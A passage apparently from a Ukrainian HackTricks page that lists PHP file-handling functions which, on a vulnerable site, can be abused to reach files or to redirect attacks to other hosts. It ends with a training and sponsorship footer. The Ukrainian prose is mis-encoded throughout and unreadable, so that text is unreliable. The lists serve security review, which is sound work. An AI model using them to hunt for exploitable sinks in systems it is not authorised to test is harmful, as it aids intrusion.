PHP-—Å–∫—Ä–∏–ø—Ç–∞ –≤ –±—É–¥—å-—è–∫–µ –º—ñ—Å—Ü–µ —Å–∏—Å—Ç–µ–º–∏. –¢–∞–∫–æ–∂, —è–∫—â–æ —Å–∞–π—Ç –≤—Ä–∞–∑–ª–∏–≤–∏–π –¥–æ –∑–∞–ø–∏—Ç—É, –Ω–∞–¥—ñ—Å–ª–∞–Ω–æ–≥–æ —á–µ—Ä–µ–∑ GET, –∫–æ–∂–Ω–∞ –∑ —Ü–∏—Ö —Ñ—É–Ω–∫—Ü—ñ–π —Ñ–∞–π–ª–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏ –º–æ–∂–µ –±—É—Ç–∏ –∑–ª–æ–≤–∂–∏—Ç–∞ –¥–ª—è –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –∞—Ç–∞–∫–∏ –Ω–∞ —ñ–Ω—à–∏–π —Ö–æ—Å—Ç —á–µ—Ä–µ–∑ –≤–∞—à —Å–µ—Ä–≤–µ—Ä.

**–í—ñ–¥–∫—Ä–∏—Ç–∏–π –æ–±—Ä–æ–±–Ω–∏–∫ —Ñ–∞–π–ª–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏**
```php
fopen
tmpfile
bzopen
gzopen
SplFileObject->__construct
```
**–ó–∞–ø–∏—Å —É —Ñ–∞–π–ª–æ–≤—É —Å–∏—Å—Ç–µ–º—É (—á–∞—Å—Ç–∫–æ–≤–æ –≤ –∫–æ–º–±—ñ–Ω–∞—Ü—ñ—ó –∑ —á–∏—Ç–∞–Ω–Ω—è–º)**
```php
chgrp
chmod
chown
copy
file_put_contents
lchgrp
lchown
link
mkdir
move_uploaded_file
rename
rmdir
symlink
tempnam
touch
unlink
imagepng     // 2nd parameter is a path.
imagewbmp    // 2nd parameter is a path.
image2wbmp   // 2nd parameter is a path.
imagejpeg    // 2nd parameter is a path.
imagexbm     // 2nd parameter is a path.
imagegif     // 2nd parameter is a path.
imagegd      // 2nd parameter is a path.
imagegd2     // 2nd parameter is a path.
iptcembed
ftp_get
ftp_nb_get
scandir
```
**–ß–∏—Ç–∞–Ω–Ω—è –∑ —Ñ–∞–π–ª–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏**
```php
file_exists
-- file_get_contents
file
fileatime
filectime
filegroup
fileinode
filemtime
fileowner
fileperms
filesize
filetype
glob
is_dir
is_executable
is_file
is_link
is_readable
is_uploaded_file
is_writable
is_writeable
linkinfo
lstat
parse_ini_file
pathinfo
readfile
readlink
realpath
stat
gzfile
readgzfile
getimagesize
imagecreatefromgif
imagecreatefromjpeg
imagecreatefrompng
imagecreatefromwbmp
imagecreatefromxbm
imagecreatefromxpm
ftp_put
ftp_nb_put
exif_read_data
read_exif_data
exif_thumbnail
exif_imagetype
hash_file
hash_hmac_file
hash_update_file
md5_file
sha1_file
-- highlight_file
-- show_source
php_strip_whitespace
get_meta_tags
```
{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
